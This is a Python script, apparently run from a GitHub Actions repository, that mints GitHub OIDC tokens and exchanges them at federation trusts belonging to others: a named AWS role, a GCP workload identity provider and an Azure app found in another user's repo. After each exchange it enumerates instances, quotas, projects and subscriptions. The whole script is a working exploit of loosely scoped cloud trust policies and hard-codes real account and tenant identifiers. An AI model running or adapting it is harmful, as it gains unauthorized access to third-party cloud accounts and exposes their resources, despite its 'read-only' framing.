#!/usr/bin/env python3
"""Intent 147714: exactly one federation candidate per provider, read-only validation.

AWS   : arn:aws:iam::420032683002:role/openvdb-fvdb-github-actions-role   (prior lane's positive control)
GCP   : projects/531508670106/locations/global/workloadIdentityPools/github-identity-pool/providers/github-id-provider
Azure : client 04c6b4e0-2144-48aa-869c-9d0892d11277 / tenant b29a1c6d-3698-4e5d-b3c6-3a7e2976bf69
        (pthoor/arrow-demo2-deploy, the only hard-coded Entra OIDC triple in the probed repos)

Mints GitHub OIDC tokens from this vehicle repo and performs the federated exchange at each
provider. Only read-only follow-up calls are made; access tokens are never printed.
"""
import json, os, base64, hashlib, hmac, datetime, urllib.request, urllib.error, urllib.parse

TAG = 'i147714'


def out(tag, obj):
    print('I147714 %s %s' % (tag, json.dumps(obj, default=str)[:1600]), flush=True)


def mint(aud):
    u = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL', '')
    t = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')
    if not u or not t:
        raise RuntimeError('oidc env missing')
    url = u + ('&' if '?' in u else '?') + 'audience=' + urllib.parse.quote(aud, safe='')
    req = urllib.request.Request(url, headers={'Authorization': 'Bearer ' + t})
    return json.loads(urllib.request.urlopen(req, timeout=30).read())['value']


def claims(tok):
    p = tok.split('.')[1]
    p += '=' * (-len(p) % 4)
    d = json.loads(base64.urlsafe_b64decode(p))
    return {k: d.get(k) for k in ('iss', 'sub', 'aud', 'repository', 'ref', 'event_name',
                                  'environment', 'job_workflow_ref')}


def http(method, url, data=None, headers=None, timeout=60):
    h = dict(headers or {})
    if isinstance(data, dict):
        data = urllib.parse.urlencode(data).encode()
        h.setdefault('Content-Type', 'application/x-www-form-urlencoded')
    req = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return -1, str(e)[:300]


def _sign(key, msg):
    return hmac.new(key, msg.encode(), hashlib.sha256).digest()


def sigv4(method, host, path, region, service, ak, sk, stk, body='',
          ctype='application/x-www-form-urlencoded', extra=None):
    t = datetime.datetime.utcnow()
    amzdate = t.strftime('%Y%m%dT%H%M%SZ')
    datestamp = t.strftime('%Y%m%d')
    headers = {'host': host, 'x-amz-date': amzdate, 'x-amz-security-token': stk}
    if body:
        headers['content-type'] = ctype
    if extra:
        for k, v in extra.items():
            headers[k.lower()] = v
    signed = sorted(headers)
    canon_headers = ''.join('%s:%s\n' % (k, headers[k].strip()) for k in signed)
    payload_hash = hashlib.sha256(body.encode()).hexdigest()
    canonical_request = '\n'.join([method, path, '', canon_headers, ';'.join(signed), payload_hash])
    scope = '%s/%s/%s/aws4_request' % (datestamp, region, service)
    sts = '\n'.join(['AWS4-HMAC-SHA256', amzdate, scope,
                     hashlib.sha256(canonical_request.encode()).hexdigest()])
    k = ('AWS4' + sk).encode()
    for m in (datestamp, region, service, 'aws4_request'):
        k = _sign(k, m)
    sig = hmac.new(k, sts.encode(), hashlib.sha256).hexdigest()
    auth = 'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s' % (
        ak, scope, ';'.join(signed), sig)
    return {'Authorization': auth, 'X-Amz-Date': amzdate, 'X-Amz-Security-Token': stk,
            'Content-Type': ctype, 'Host': host}


def aws_api(creds, region, service, body, target=None, ctype='application/x-amz-json-1.1'):
    ak, sk, stk = creds['AccessKeyId'], creds['SecretAccessKey'], creds['SessionToken']
    if service == 'sts':
        host, path = 'sts.amazonaws.com', '/'
    else:
        host, path = '%s.%s.amazonaws.com' % (service, region), '/'
    extra = {'x-amz-target': target} if target else None
    hdrs = sigv4('POST', host, path, region, service, ak, sk, stk, body=body, ctype=ctype, extra=extra)
    return http('POST', 'https://' + host + path, body, hdrs)


def xml_fields(txt):
    import xml.etree.ElementTree as ET
    try:
        root = ET.fromstring(txt)
    except Exception:
        return {}
    res = {}
    for el in root.iter():
        name = el.tag.split('}')[-1]
        if name in ('AccessKeyId', 'SecretAccessKey', 'SessionToken', 'Code', 'Message',
                    'Arn', 'Account', 'UserId', 'RoleArn'):
            res[name] = el.text
    return res


def aws_probe():
    role = 'arn:aws:iam::420032683002:role/openvdb-fvdb-github-actions-role'
    tok = mint('sts.amazonaws.com')
    out('AWS-CLAIMS', claims(tok))
    body = urllib.parse.urlencode({'Action': 'AssumeRoleWithWebIdentity', 'Version': '2011-06-15',
                                   'RoleArn': role, 'RoleSessionName': TAG,
                                   'WebIdentityToken': tok, 'DurationSeconds': '3600'}).encode()
    st, txt = http('POST', 'https://sts.amazonaws.com/', body,
                   {'Content-Type': 'application/x-www-form-urlencoded'})
    f = xml_fields(txt) if st == 200 else {}
    out('AWS-ASSUME', {'http': st, 'role': role, 'code': f.get('Code'),
                       'message': (f.get('Message') or '')[:300],
                       'assumed': bool(f.get('AccessKeyId'))})
    if not f.get('AccessKeyId'):
        return
    st, txt = aws_api(f, 'us-east-1', 'sts', 'Action=GetCallerIdentity&Version=2011-06-15')
    out('AWS-G1-CALLER', {'http': st, 'body': txt[:500]})
    st, txt = aws_api(f, 'us-east-1', 'servicequotas',
                      json.dumps({'ServiceCode': 'sagemaker', 'MaxResults': 100}),
                      target='ServiceQuotasV20190624.ListServiceQuotas')
    vals = []
    try:
        for q in json.loads(txt).get('Quotas', []):
            nm = q.get('QuotaName') or ''
            if 'training job' in nm or 'endpoint' in nm or 'ml.' in nm:
                vals.append([nm, q.get('Value')])
    except Exception:
        pass
    out('AWS-G4-QUOTA', {'http': st, 'quotas': vals[:20], 'body': '' if st == 200 else txt[:200]})
    st, txt = aws_api(f, 'us-east-1', 'ec2', 'Action=DescribeCapacityReservations&Version=2016-11-15')
    out('AWS-G5-CAPRES', {'http': st, 'body': txt[:400]})
    st, txt = aws_api(f, 'us-east-1', 'ec2', 'Action=DescribeInstances&Version=2016-11-15')
    out('AWS-INSTANCES', {'http': st, 'body': txt[:400]})


def gcp_probe():
    prov = ('projects/531508670106/locations/global/workloadIdentityPools/'
            'github-identity-pool/providers/github-id-provider')
    tok = mint('//iam.googleapis.com/' + prov)
    out('GCP-CLAIMS', claims(tok))
    st, txt = http('POST', 'https://sts.googleapis.com/v1/token', {
        'grant_type': 'urn:ietf:params:oauth:grant-type:token-exchange',
        'audience': '//iam.googleapis.com/' + prov,
        'scope': 'https://www.googleapis.com/auth/cloud-platform',
        'requested_token_type': 'urn:ietf:params:oauth:token-type:access_token',
        'subject_token_type': 'urn:ietf:params:oauth:token-type:jwt',
        'subject_token': tok})
    out('GCP-G1-STS', {'http': st, 'body': txt[:700]})
    if st != 200:
        return
    try:
        at = json.loads(txt).get('access_token', '')
    except Exception:
        at = ''
    if not at:
        return
    out('GCP-TOKEN', {'len': len(at), 'sha16': hashlib.sha256(at.encode()).hexdigest()[:16]})
    for tag, url in (
        ('GCP-PROJECT', 'https://cloudresourcemanager.googleapis.com/v1/projects/531508670106'),
        ('GCP-INSTANCES', 'https://compute.googleapis.com/compute/v1/projects/531508670106/aggregated/instances?maxResults=20'),
        ('GCP-SERVICES', 'https://serviceusage.googleapis.com/v1/projects/531508670106/services?filter=state:ENABLED&pageSize=10'),
        ('GCP-QUOTAS', 'https://compute.googleapis.com/compute/v1/projects/531508670106/regions/us-central1/quotas'),
    ):
        st, txt = http('GET', url, headers={'Authorization': 'Bearer ' + at})
        out(tag, {'http': st, 'body': txt[:600]})


def azure_probe():
    tenant = 'b29a1c6d-3698-4e5d-b3c6-3a7e2976bf69'
    client = '04c6b4e0-2144-48aa-869c-9d0892d11277'
    tok = mint('api://AzureADTokenExchange')
    out('AZ-CLAIMS', claims(tok))
    st, txt = http('POST', 'https://login.microsoftonline.com/%s/oauth2/v2.0/token' % tenant, {
        'client_id': client,
        'scope': 'https://management.azure.com/.default',
        'grant_type': 'client_credentials',
        'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
        'client_assertion': tok})
    body = txt[:1200]
    try:
        j = json.loads(txt)
        if j.get('access_token'):
            body = 'ACCESS_TOKEN_PRESENT len=%d' % len(j['access_token'])
    except Exception:
        j = {}
    out('AZ-G1-EXCHANGE', {'http': st, 'tenant': tenant, 'client': client, 'body': body})
    at = j.get('access_token') if isinstance(j, dict) else None
    if not at:
        return
    out('AZ-TOKEN', {'len': len(at), 'sha16': hashlib.sha256(at.encode()).hexdigest()[:16]})
    st, txt = http('GET', 'https://management.azure.com/subscriptions?api-version=2022-12-01',
                   headers={'Authorization': 'Bearer ' + at})
    out('AZ-SUBSCRIPTIONS', {'http': st, 'body': txt[:1200]})
    if st == 200:
        try:
            subs = json.loads(txt).get('value', [])
        except Exception:
            subs = []
        for s in subs[:5]:
            sid = s.get('subscriptionId')
            out('AZ-SUB', {'id': sid, 'state': s.get('state')})
            st2, txt2 = http('GET',
                             'https://management.azure.com/subscriptions/%s/providers/Microsoft.Compute/usages?api-version=2023-07-01&location=eastus' % sid,
                             headers={'Authorization': 'Bearer ' + at})
            out('AZ-G4-USAGE', {'sub': sid, 'http': st2, 'body': txt2[:600]})


def main():
    out('ENV', {'repo': os.environ.get('GITHUB_REPOSITORY'), 'ref': os.environ.get('GITHUB_REF'),
                'event': os.environ.get('GITHUB_EVENT_NAME'), 'run': os.environ.get('GITHUB_RUN_ID'),
                'sha': os.environ.get('GITHUB_SHA')})
    for name, fn in (('AWS', aws_probe), ('GCP', gcp_probe), ('AZURE', azure_probe)):
        try:
            fn()
        except Exception as e:
            out(name + '-FATAL', {'error': str(e)[:400]})
    out('DONE', {'ok': True})


if __name__ == '__main__':
    main()
